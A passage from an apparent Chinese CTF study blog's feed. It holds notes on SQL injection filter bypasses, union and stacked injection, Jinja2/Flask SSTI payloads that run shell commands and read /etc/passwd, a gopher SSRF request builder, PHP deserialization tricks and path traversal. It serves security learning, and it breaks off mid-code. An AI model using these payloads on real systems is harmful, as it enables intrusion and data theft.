        <content type="html"><![CDATA[<h1 id="SQL’select’绕过"><a href="#SQL’select’绕过" class="headerlink" title="SQL’select’绕过"></a>SQL’select’绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><h2 id="直接查询handler函数使用语法"><a href="#直接查询handler函数使用语法" class="headerlink" title="##直接查询handler函数使用语法"></a>##直接查询<br>handler函数使用<br><code>语法</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">先是创造句柄</span><br><span class="line">handler `()` open as p;</span><br><span class="line"></span><br><span class="line">然后是查看数据</span><br><span class="line"># 获取第一行数据</span><br><span class="line">handler p read handler_index first;</span><br><span class="line"># 获取下一行数据</span><br><span class="line">handler p read handler_index next;</span><br><span class="line"># 获取上一行数据</span><br><span class="line">handler p read handler_index prev;</span><br><span class="line"># 获取最后一行数据</span><br><span class="line">handler p read handler_index last;</span><br><span class="line"></span><br></pre></td></tr></table></figure></h2><p>##改表和行名<br>alter函数使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先将原来表名改为别的: alter table `默认的` rename to `sss`</span><br><span class="line">重命名表：alter table &#x27;表名&#x27; rename to &#x27;默认查寻的表名&#x27;。</span><br><span class="line">重命名字段：alter table &#x27;默认查询的表名&#x27; change &#x27;要转移的字段&#x27; &#x27;默认查询的字段&#x27; column_type（就是varchar(100)）;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQLite</title>
      <link href="/blog/2026/01/28/SQLite/"/>
      <url>/blog/2026/01/28/SQLite/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h1><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL union联合注入</title>
      <link href="/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
      <url>/blog/2026/01/28/SQL%20union%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL-union联合注入"><a href="#SQL-union联合注入" class="headerlink" title="SQL union联合注入"></a>SQL union联合注入</h1><p>标签（空格分隔）： SQL</p><p>—首先数据库的定义: 数据的组织结构分为数据库(database)、数据表(table)、数据行(row)、字段(field)</p><p>重要点:union的使用,union</p><p>查表用：<code>1&#39; order by (数字)#</code><br>‘&#x2F;&#x2F;该过程的作用是查询有几列，一直查询到不能查询为止<br>&#x2F;&#x2F;#号的作用是将后面的代码给注释掉</p><p>当想将一些弹出的东西给查询失效只需要：<br><code>1&#39; union select 1,2,...(查询所弹出的数组)</code><br>&#x2F;&#x2F;同时得到可以回显的列表<br>&#x2F;&#x2F;目的还是将页面变得整洁，并且得到列</p><p>当想知道某个数据库的名字只用：<br><code>1&#39; union select 1,2(可以回显的列表,但是要求从1一直到可以查询的列但只能到一个比如1，2),database()#</code><br>&#x2F;&#x2F;database()函数的目的就是获取名字<br>&#x2F;&#x2F;数字一定要从1开始到能回显的一个</p><p>想要获取所属的表的名字：<br><code>1&#39;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#39;（）&#39;--+#</code><br>&#x2F;&#x2F;首先group concat(table name)的作用是获取  ‘数据库’  的所有的表的名字并组合成一个字符串，简洁一点说就是知道数据表<br>&#x2F;&#x2F;然后table_name: 信息模式(information_schema)中tables表的列名，包含所有表名<br>&#x2F;&#x2F;查询表information_schema.tables: 系统表，存储了关于数据库中所有表的信息<br>&#x2F;&#x2F;再进行一个限制table_schema&#x3D;’news’: 条件限制，只查询属于”news”数据库的表</p><p>再查询他的列：<br><code>?wllm=2&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;test_tb&#39;--+</code><br>&#x2F;&#x2F;这样可以获得所有的列的名字</p><p>如果有的列的名字带有flag：<br><code>2&#39;union select 1,2,flag from test_tb--+#</code></p><p>‘union select 1,2,flag from test_tb–+#</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL空格绕过</title>
      <link href="/blog/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
      <url>/blog/2026/01/28/SQL%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL空格绕过"><a href="#SQL空格绕过" class="headerlink" title="SQL空格绕过"></a>SQL空格绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>##内联绕过<br>首先是空格被过滤了可以使用内联绕过具体使用例子如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原始语句：</span><br><span class="line">UNION SELECT 1,2,3</span><br><span class="line"></span><br><span class="line">绕过方式：</span><br><span class="line">UNI/*任意内容*/ON SEL/*注释*/ECT 1,2,3</span><br></pre></td></tr></table></figure><p>这样就可以绕过了</p><hr>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL&quot;,&quot;号绕过</title>
      <link href="/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/"/>
      <url>/blog/2026/01/28/SQL_,_%E5%8F%B7%E7%BB%95%E8%BF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL”-”号绕过"><a href="#SQL”-”号绕过" class="headerlink" title="SQL”,”号绕过"></a>SQL”,”号绕过</h1><p>标签（空格分隔）： SQL绕过</p><hr><p>join注入：当，被过滤的时候可以使用该方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">SELECT *</span><br><span class="line">FROM users</span><br><span class="line">UNION</span><br><span class="line">SELECT *</span><br><span class="line">FROM (</span><br><span class="line">(SELECT 1) A</span><br><span class="line">JOIN (SELECT 2) B</span><br><span class="line">JOIN (SELECT 3) C</span><br><span class="line">JOIN (SELECT 4) D</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>此时空格被过滤的化可以使用%0a（URL编译）和%09（水平换行）<br>见<a href="https://blog.csdn.net/qq_61778128/article/details/123205490">https://blog.csdn.net/qq_61778128/article/details/123205490</a></p><p>sqlite注入查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">union</span><br><span class="line">select*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTnameFROMsqlite_master)d</span><br><span class="line">join(selectSELECTsqlFROMsqlite_master)f</span><br></pre></td></tr></table></figure><p>找到后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">unionselect*</span><br><span class="line">from</span><br><span class="line">(select1)a</span><br><span class="line">join(select2)b</span><br><span class="line">join(select3)c</span><br><span class="line">join(SELECTconfig_keyFROMsys_config)d</span><br><span class="line">join(SELECTconfig_valueFROMsys_config)f`</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL堆叠注入</title>
      <link href="/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
      <url>/blog/2026/01/28/SQL%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL堆叠注入"><a href="#SQL堆叠注入" class="headerlink" title="SQL堆叠注入"></a>SQL堆叠注入</h1><p>标签（空格分隔）： SQL</p><hr><p>运用情况：当有过滤select&#x2F;updata&#x2F;delete&#x2F;drop等等词的时候进行堆叠注入<br>所以只能使用hander来进行查询（hander不算正规的php，仅仅在MYsql中存在）<br>hander的</p><p>具体用法如下<br>– 创建索引<br><code>CREATE INDEX handler_index ON handler_table(id);</code></p><p>– 打开句柄<br><code>HANDLER handler_table OPEN AS p;</code></p><p>– 按索引读取第一行<br><code>HANDLER p READ handler_index FIRST;</code></p><p>– 按索引读取下一行<br><code>HANDLER p READ handler_index NEXT;</code></p><p>– 关闭句柄<br><code>HANDLER p CLOSE;</code></p><p>1.首先还是查询有几列<br><code>1&#39;order by 1;#</code></p><p>2.由于无法使用select，所以只能直接查询所有的数据库<br><code>1&#39;show databases;#</code></p><p>3.当查询到一个奇妙的数据库的时候使用<br><code>1&#39;;use (数据库名字);show tables;#</code></p><p>4.当找到了一个表有点奇怪（纯数字）的时候<br> <code>1&#39;;use supersqli;show columns from </code>表的名字<code>;#</code><br>&#x2F;&#x2F;注意当纯数字串是表名的时候要加反引号</p><p>5.此时可能找到了flag的位置，但是无法使用select所以使用hander<br><code>-1&#39;;use supersqli;handler (填入，纯数字记得加``) open as p;handler p read first;#</code></p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSTI简记</title>
      <link href="/blog/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/"/>
      <url>/blog/2026/01/28/SSTI%E7%AE%80%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="SSTI简记"><a href="#SSTI简记" class="headerlink" title="SSTI简记"></a>SSTI简记</h1><p>标签（空格分隔）： ssti</p><hr><h2 id="识别模板引擎"><a href="#识别模板引擎" class="headerlink" title="##识别模板引擎##"></a>##识别模板引擎##<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125; → 49 (成功)     # Jinja2, Twig</span><br><span class="line">$&#123;7*7&#125; → 49 (成功)      # FreeMarker</span><br><span class="line">&lt;%= 7*7 %&gt; → 49 (成功)  # ERB, Ruby</span><br><span class="line">#&#123;7*7&#125; → 49 (成功)      # Jade/Pug</span><br></pre></td></tr></table></figure></h2><p>###基础知识类###</p><table><thead><tr><th>组件</th><th>作用</th></tr></thead><tbody><tr><td>‘’</td><td>一个具体的对象</td></tr><tr><td><strong>class</strong></td><td>查看这个对象的类</td></tr><tr><td><strong>mro</strong></td><td>查看类的继承关系</td></tr><tr><td><strong>mro</strong>[1]</td><td>获取基类（object）</td></tr><tr><td><strong>subclasses</strong>()</td><td>获取所有子类</td></tr></tbody></table><hr><p>###沙盒逃逸(Jinjia2&#x2F;Flask)###</p><p>####A基础对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__&#125;&#125;  # 获取字符串类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__&#125;&#125;  # 方法解析顺序</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()&#125;&#125;  # 所有子类</span><br></pre></td></tr></table></figure><p>####B寻找危险类</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找file类</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>file类只能是大概在40左右具体的得通过不断的尝试来获取,然后直接查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 查找os模块</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>os模块可以直接调用命令来进行比如system(‘ls’)之类的</p><p><code>大概位置如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Python 2常见索引</span><br><span class="line"># 常见的危险类索引</span><br><span class="line">file类: 索引40左右</span><br><span class="line">subprocess.Popen: 索引258左右</span><br><span class="line">os._wrap_close: 索引132左右（在socket模块中）</span><br><span class="line"></span><br><span class="line"># Python 3常见索引</span><br><span class="line">_io.TextIOWrapper: 索引4左右（用于文件操作）</span><br><span class="line">subprocess.Popen: 索引289左右</span><br><span class="line">os._wrap_close: 索引132左右（最常用！）</span><br></pre></td></tr></table></figure><p><code>常见的payload如下</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># RCE示例</span><br><span class="line">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;ls&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;].popen(&#x27;id&#x27;).read()&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&#x27;whoami&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto实用函数类</title>
      <link href="/blog/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/"/>
      <url>/blog/2026/01/28/crypto%20python%E5%87%BD%E6%95%B0%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h1 id="crypto-python函数类"><a href="#crypto-python函数类" class="headerlink" title="crypto python函数类"></a>crypto python函数类</h1><p>标签（空格分隔）： crypto</p><hr><p>求$a^{x} &#x3D; c \mod m $</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from sympy.ntheory import discrete_log</span><br><span class="line">M = 100000000000099</span><br><span class="line">c = 114514</span><br><span class="line">a = 13</span><br><span class="line">x = discrete_log(M, c, a)</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure><p>使用discrete_log库的discrete_log</p><hr>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gopher_协议使用</title>
      <link href="/blog/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/"/>
      <url>/blog/2026/01/28/gopher___%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="gopher-x2F-x2F-协议使用"><a href="#gopher-x2F-x2F-协议使用" class="headerlink" title="gopher:&#x2F;&#x2F;协议使用"></a>gopher:&#x2F;&#x2F;协议使用</h1><p>标签（空格分隔）： SSRF</p><hr><p>|gopher|发送原始 TCP 数据（高级利用）|构造gopher:&#x2F;&#x2F;127.0.0.1:3306&#x2F;_%23…（向 MySQL 发送恶意 SQL 命令）|<br>|——|</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">传输脚本如下</span><br><span class="line"># 导入urllib.parse模块，用于URL编码处理</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># 定义目标主机和端口</span><br><span class="line">host = &quot;127.0.0.1:80&quot;</span><br><span class="line"># 定义POST请求的表单数据（模拟登录的用户名和密码）\\\\\\\\\\\\\\\\\\\\注意根据题目不同进行参数更改</span><br><span class="line">content = &quot;uname=admin&amp;passwd=admin&quot;</span><br><span class="line"># 计算POST数据的长度，用于HTTP头中的Content-Length字段</span><br><span class="line">content_length = len(content)</span><br><span class="line"></span><br><span class="line"># 构造完整的POST请求报文（HTTP协议格式）</span><br><span class="line">test =\</span><br><span class="line">&quot;&quot;&quot;POST /index.php HTTP/1.1  # HTTP方法为POST，请求路径为/index.php，协议版本1.1</span><br><span class="line">Host: &#123;&#125;  # 目标主机（通过format填充上面定义的host变量）</span><br><span class="line">User-Agent: curl/7.43.0  # 模拟curl的User-Agent头</span><br><span class="line">Accept: */*  # 接受所有类型的响应数据</span><br><span class="line">Content-Type: application/x-www-form-urlencoded  # 表单数据的MIME类型</span><br><span class="line">Content-Length: &#123;&#125;  # POST数据的长度（通过format填充content_length变量）</span><br><span class="line"></span><br><span class="line">&#123;&#125;  # POST请求的表单数据（通过format填充content变量）</span><br><span class="line"># &quot;&quot;&quot;.format(host,content_length,content)  # 用format方法替换占位符，填充host、长度和数据</span><br><span class="line"></span><br><span class="line"># 对构造的HTTP报文进行第一次URL编码（将特殊字符转为%XX格式）</span><br><span class="line">tmp = urllib.parse.quote(test)</span><br><span class="line"># 将编码后的换行符%0A（\n）替换为HTTP标准的回车换行%0D%0A（\r\n），避免协议解析错误</span><br><span class="line">new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)</span><br><span class="line"># 对处理后的字符串进行第二次URL编码，确保gopher协议能正确解析</span><br><span class="line">result = urllib.parse.quote(new)</span><br><span class="line"># 拼接为gopher协议URL（格式：gopher://主机/_编码后的请求内容），用于SSRF等场景</span><br><span class="line">print(&quot;gopher://&quot;+host+&quot;/_&quot;+result)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php函数简记</title>
      <link href="/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/"/>
      <url>/blog/2026/01/28/php%E5%87%BD%E6%95%B0%E7%AE%80%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>一些简单php函数简记</p><p>标签（空格分隔）： PHP </p><p>–PHP 函数</p><h2 id="php函数简记"><a href="#php函数简记" class="headerlink" title="php函数简记"></a>php函数简记</h2><p>在此输入正文</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mb_substr()：函数返回字符串的一部分。substr() 函数，它只针对英文字符，如果要分割的中文文字则需要使用mb_substr()。</span><br><span class="line">//注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 0。</span><br><span class="line"></span><br><span class="line">mb_strpos()：查找字符串在另一个字符串中首次出现的位置</span><br><span class="line"></span><br><span class="line">in_array()函数：搜索数组中是否存在指定的值。</span><br><span class="line">//注释：如果 search 参数是字符串且 type 参数被设置为 TRUE，则搜索区分大小写。</span><br><span class="line"></span><br><span class="line">strstr()函数：用于在一个字符串查找另一个字符串的第一次出现</span><br><span class="line">//注释：区分大小写</span><br><span class="line"></span><br><span class="line">urldecode()：解码已编码的 URL 字符串</span><br><span class="line"></span><br><span class="line">ord()：返回字符串第一个字符的ASCll值</span><br><span class="line"></span><br><span class="line">strrev()：用于反转字符串</span><br><span class="line">//如：strrev(&quot;hello&quot;)  echo: olleh</span><br><span class="line"></span><br><span class="line">strlen()：用于获取字符串的长度。返回字节数</span><br><span class="line"></span><br><span class="line">str_rot：用于对字符串进行ROT13编码</span><br><span class="line"></span><br><span class="line">chr()：用于从指定的ASCll值返回字符</span><br><span class="line">//注释：可以是10/8/16进制</span><br><span class="line"></span><br><span class="line">file_get_contents()： 是PHP中用于读取文件内容的函数</span><br><span class="line">//注释：将文件中数据提取为字符串的函数，要用data://协议构造数据流，使它当作php文件。</span><br><span class="line">//所以需要这样设计代码：?file2=data://text/plain,hello ctf</span><br><span class="line"></span><br><span class="line">str_split() 函数用于将字符串按指定的分隔符分割成多个子字符串，并返回一个包含这些子字符串的列表</span><br><span class="line"></span><br><span class="line">ctype_alpha 函数用于检测字符串中的所有字符是否都是字母。它返回布尔值：如果字符串中的每个字符都是字母，则返回 true，否则返回 false</span><br><span class="line"></span><br><span class="line">ctype_upper：检测提供的 string 类型的 text 里面的所有字符是否都是大写字符</span><br><span class="line"></span><br><span class="line">strlen() :检测字符串长度</span><br><span class="line">__destruct()：这是一个析构函数，在对象的所有引用被删除或者当对象被显示销毁执行的魔术方法。注意：在实例化对象后，代码运行完全销毁，会触发析构函数__destruct()；反序列化得到的是对象，用完之后会销毁，触发析构函数。这道题中发序列化之后就会触发析构函数。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP魔术技巧</title>
      <link href="/blog/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/"/>
      <url>/blog/2026/01/28/php%E9%AD%94%E6%9C%AF%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="php魔术技巧"><a href="#php魔术技巧" class="headerlink" title="php魔术技巧"></a>php魔术技巧</h1><p>标签（空格分隔）： PHP #魔术技巧#</p><p>—php</p><p>反序列化的基本格式：O:组的字节:”定义的组的名字”:有几个参数:{s:4:”flag”;s:3:”111”;}</p><p>构造脚本可以在后面这么加$A &#x3D; new Demo (‘fl4g.php’);&#x2F;&#x2F;创建对象<br>                                      $C &#x3D; serialize($A); </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_wakeup()：如果察觉到有反序列化的参数值那么将会拒绝执行</span><br><span class="line">//绕过方法：将序列化的对象的属性（参数个数）个数改了</span><br><span class="line"></span><br><span class="line">__destruct():当对象的所有引用被删除或脚本执行结束时，PHP 会自动调用析构函数。</span><br><span class="line"></span><br><span class="line">preg_match(’/[oc]:\d+:/i’, $var)：当中括号的东西出现就会被过滤&#123;应对办法：单双引号绕过</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__construct()：这是一个构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/blog/2026/01/28/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>标签（空格分隔）： 文件类</p><hr><p>通常没有看到可以输入的框的时候可以试着看看URL的构造来进行分析<br>以攻防世界—-catcat-new为例<br>看着没有什么输入口但是观察URL–</p><p><a href="http://61.147.171.35:51092/info?file=ForestCat.txt">http://61.147.171.35:51092/info?file=ForestCat.txt</a></p><p>有一个get了一个file&#x3D;……此时思考是否会存在文件包含漏洞<br>进行目录遍历..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd看看</p><p>![基础知识][1]<br>  [1]: <a href="https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png">https://i-blog.csdnimg.cn/blog_migrate/a32eefce2f8aed5db5aa74de0dc8dd14.png</a></p><p>然后再用diserach扫描看看有没有可以访问的窗口<br>再用用wappalyzer看看框架，再搜一下他的主文件是什么<br>再进行目录遍历查询主文件</p><p>flask框架的主文件是app.py查询后由于过于复杂此时要进行可视化</p><pre><code>#需要格式化的代码</code></pre><p>code_str &#x3D; ‘’’输入’’’<br>lines &#x3D; code_str.split(‘\n’)<br>indented_lines &#x3D; [line if line.strip() else ‘’ for line in lines]<br>formatted_code &#x3D; 